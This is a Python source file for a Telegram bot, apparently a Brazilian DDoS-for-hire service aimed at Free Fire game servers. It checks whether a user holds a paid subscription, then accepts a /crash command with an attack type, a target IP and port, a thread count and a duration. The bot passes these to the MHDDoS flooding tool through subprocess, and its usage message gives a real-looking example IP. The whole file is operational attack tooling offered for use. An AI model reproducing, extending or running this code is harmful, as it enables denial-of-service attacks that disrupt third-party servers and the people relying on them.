import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "Cole seu Token aqui..."
ADMIN_ID = Cole seu Id aqui...
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "🎁 Your plan has expired."
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✨️ You are a subscriber to a plan!\n"
                f"⏳ Days remaining: {dias_restantes} dia(s)\n"
                f"📅 Expires on: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}\n\n"
                f"🎉 Thank you for subscribing!"
            )
    else:
        vip_status = "😔 Oops... you don't have an active plan!"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="Adiquirir Base",
        url=f"tg://user?id=7310209040"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "👋🏻 *Welcome to Free Fire Brazil | Crash, the best Brazilian crash bot currently!*"
            

            f"""
```
{vip_status}```\n"""
            "🧐 *How to use?*"
            """
```
/crash <Tipo> <IP/Host:Port> <Threads> <ms>```\n"""
            "💡 *Exemplo:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n\n"""
            "🔔 *Do not remove credits! Porfavor. 🫠*\n"
            "👑 *Base Developer:* @lukeewqz7"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["addplan"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ It is not allowed to use this type of command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Formato inválido, use: `/addplan <ID> <How many days>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"🎉 User {telegram_id} has become a subscriber for {days} day(s).")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ It is not allowed to use this type of command.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "😱 Your plan has expired.")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 5:
        bot.reply_to(message, "🔧 Wait 5 seconds before starting another attack.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "*Incorrect/invalid format!*\n\n"
                "📌 *Correct use:*\n"
                """
```
/crash <Tipo> <IP/Host:Port> <Threads> <ms>```\n\n"""
                "💡 *Exemplo:*\n"
                """
```
/crash UDP 143.92.125.230:10013 10 900```\n\n"""
                "👑 *Base Developer:* @lukeewqz7"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Parar Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*Attack was successfully initiated!*\n\n"
            f"🌐 *IP/Host:Port:* {ip_port}\n"
            f"⚙️ *Type:* {attack_type}\n"
            f"🧟 *Threads:* {threads}\n"
            f"⏳ *Tempo (ms):* {duration}\n\n"
            f"👑 *Base Developer:* @lukeewqz7"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Only the user who started it can stop it.."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Attack successfully stopped.")
        bot.edit_message_text(
            "*⛔️ Attack completed successfully!*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ No active attacks found at this time.")

if __name__ == "__main__":
    bot.infinity_polling()
